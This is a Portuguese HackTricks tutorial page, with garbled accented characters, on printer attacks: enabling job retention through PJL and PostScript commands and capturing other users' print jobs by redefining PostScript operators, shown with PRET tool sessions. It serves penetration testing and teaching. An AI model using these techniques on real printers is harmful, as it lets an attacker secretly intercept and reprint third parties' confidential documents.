<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>


# Reten√ß√£o de Trabalhos de Impress√£o

Algumas impressoras t√™m trabalhos de impress√£o armazenados acess√≠veis pelo servidor web. Geralmente, no entanto, a reten√ß√£o de trabalhos deve ser explicitamente ativada para um determinado trabalho de impress√£o e pode ser feita usando comandos PJL padr√£o ou c√≥digo PostScript propriet√°rio. Os trabalhos s√£o ent√£o mantidos na mem√≥ria e podem ser reimpressos a partir do painel de controle.

## PJL

A reten√ß√£o leg√≠tima de trabalhos pode ser habilitada para o documento atual definindo a vari√°vel PJL HOLD conforme mostrado abaixo:
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
Trabalhos em espera s√£o mantidos na mem√≥ria e podem ser reimpressos a partir do painel de controle da impressora. Esta funcionalidade √© suportada por v√°rias impressoras, no entanto, parece que apenas alguns dispositivos Epson permitem que a reten√ß√£o permanente de trabalhos seja configurada usando `@PJL DEFAULT HOLD=ON`.

**Como testar para este ataque?**

Use o comando `hold` do [**PRET**](https://github.com/RUB-NDS/PRET) no modo pjl para verificar se a reten√ß√£o permanente de trabalhos pode ser configurada:
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

PostScript oferece funcionalidades similares que, no entanto, s√£o espec√≠ficas do modelo e do fabricante. Para a s√©rie HP LaserJet 4k e v√°rias impressoras Kyocera, a reten√ß√£o de trabalhos pode ser ativada ao adicionar os seguintes comandos no in√≠cio de um documento PostScript:
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
Enquanto √© teoricamente poss√≠vel habilitar permanentemente a reten√ß√£o de trabalhos PostScript usando o operador [startjob ](./#postscript-ps), essa configura√ß√£o √© explicitamente redefinida pelo CUPS no in√≠cio de cada trabalho de impress√£o usando `<< /Collate false >> setpagedevice`. No entanto, para contornar esse mecanismo de prote√ß√£o, o atacante pode redefinir permanentemente o operador `setpagedevice` para que n√£o tenha efeito algum.

**Como testar esse ataque?**

Use o comando `hold` do [**PRET** ](https://github.com/RUB-NDS/PRET) no modo ps:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# Captura de Trabalho

√â poss√≠vel, embora incomum, ativar a reten√ß√£o de trabalho no di√°logo de impress√£o, como discutido acima. Com PostScript, no entanto, tem-se acesso completo ao trabalho de impress√£o atual e, com o operador [startjob](./#postscript-ps), √© at√© poss√≠vel sair do loop do servidor e acessar trabalhos futuros. Tal funcionalidade tem o potencial de capturar todos os documentos se PostScript for usado como um driver de impressora.

## PostScript

Com a capacidade de se conectar a operadores PostScript arbitr√°rios, √© poss√≠vel manipular e acessar trabalhos de impress√£o de terceiros. Para **analisar o fluxo de dados real enviado para a impressora**, pode-se aplicar um recurso muito interessante da linguagem PostScript: ler seu pr√≥prio c√≥digo de programa como dados usando o operador `currentfile`. Dessa forma, todo o fluxo de dados a ser processado pelo interpretador PostScript pode ser acessado pela leitura e armazenado em um arquivo no dispositivo de impress√£o. Se a impressora n√£o oferecer acesso ao sistema de arquivos, **documentos capturados podem ser armazenados na mem√≥ria**, por exemplo, dentro de dicion√°rios PostScript permanentes. \
Um problema pr√°tico √© decidir **qual operador deve ser interceptado**, pois n√£o se tem acesso ao fluxo de dados at√© que esse operador seja processado pelo interpretador PostScript. Como o atacante deseja capturar trabalhos de impress√£o desde o in√≠cio, o **operador redefinido deve ser o primeiro operador** contido no documento PostScript. Felizmente, todos os documentos impressos com CUPS t√™m uma estrutura fixa que come√ßa com `currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`. Com base na suposi√ß√£o de tal estrutura fixa, o atacante pode capturar documentos desde o in√≠cio e executar (ou seja, imprimir) o arquivo posteriormente. Para sistemas de impress√£o **diferentes de CUPS**, esse ataque tamb√©m deve ser poss√≠vel, mas **os operadores precisam ser adaptados**. Observe que o cabe√ßalho PostScript, que geralmente inclui tamanho de m√≠dia, nomes de usu√°rio e de trabalho, n√£o pode ser capturado usando este m√©todo porque primeiro nos conectamos no in√≠cio do documento real. Outra estrat√©gia gen√©rica para se conectar no in√≠cio de cada trabalho de impress√£o √© definir o par√¢metro do sistema `BeginPage`, se suportado pela impressora (a maioria das impressoras suporta). Essa vulnerabilidade provavelmente est√° presente em dispositivos de impress√£o h√° d√©cadas, pois apenas constru√ß√µes de linguagem definidas pelo padr√£o PostScript s√£o exploradas.

Use o comando `capture` do [**PRET**](https://github.com/RUB-NDS/PRET) no modo ps:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture
Print job operations:  capture <operation>
capture start   - Record future print jobs.
capture stop    - End capturing print jobs.
capture list    - Show captured print jobs.
capture fetch   - Save captured print jobs.
capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
Agora, imprima documentos arbitr√°rios (certifique-se de que o PRET esteja desconectado para n√£o bloquear o canal de impress√£o). Posteriormente, voc√™ pode listar, buscar ou reimprimir documentos capturados:
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Jan 25 18:38  3.1M  -              -                       -
Jan 25 18:40  170K  -              -                       -
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received.
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
